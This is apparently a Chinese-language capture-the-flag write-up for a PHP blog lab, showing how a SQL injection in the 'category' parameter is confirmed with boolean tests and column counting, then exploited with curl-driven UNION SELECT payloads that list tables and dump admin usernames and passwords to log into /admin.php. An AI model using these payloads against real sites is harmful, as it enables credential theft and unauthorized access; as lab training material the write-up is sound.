## 题解

### 入口与指纹

`Apache/2.4.54` + `PHP/7.4.33`，首页 `Blog Home`，分类下拉 `GET /?category=Nature`。
页面本身有一条 `Undefined variable: category` 的 Notice（`index.php:28`），说明参数直接进查询。

### 关键观察

布尔判断即可定性：

| `category` | 页面大小 |
| --- | --- |
| `Nature' AND 1=1-- -` | 2658（有 3 篇） |
| `Nature' AND 1=2-- -` | 1402（0 篇） |

`ORDER BY 7` 正常、`8` 失败 → 7 列。回显位是第 2 列（标题）和第 5 列（图片）。

### 利用链

```bash
T=$(head -1 .target)
# 表名
curl -sS -G --data-urlencode \
  "category=x' UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),3,4,5,6,7-- -" \
  "http://$T/" | grep -o '<h2>[^<]*'
# admins
curl -sS -G --data-urlencode \
  "category=x' UNION SELECT 1,(SELECT GROUP_CONCAT(username,0x3a,password) FROM admins),3,4,5,6,7-- -" \
  "http://$T/" | grep -o '<h2>[^<]*'
```

拿到 `admin:<password>` 后登录 `/admin.php`，响应正文即 flag。

另有隐藏文章 `id=12`（`published=0`，标题 `SECRET POST`），直接把 `posts` 的列查出来即可读到。

### flag 位置

`/admin.php` 用管理员口令登录后的页面正文。

## 复盘

- `ORDER BY n` 数出列数，再用 `UNION SELECT` 把值放到标题位。
- 管理口令适合先试 `/admin.php`；flag 也可能直接藏在 `published=0` 的文章里。
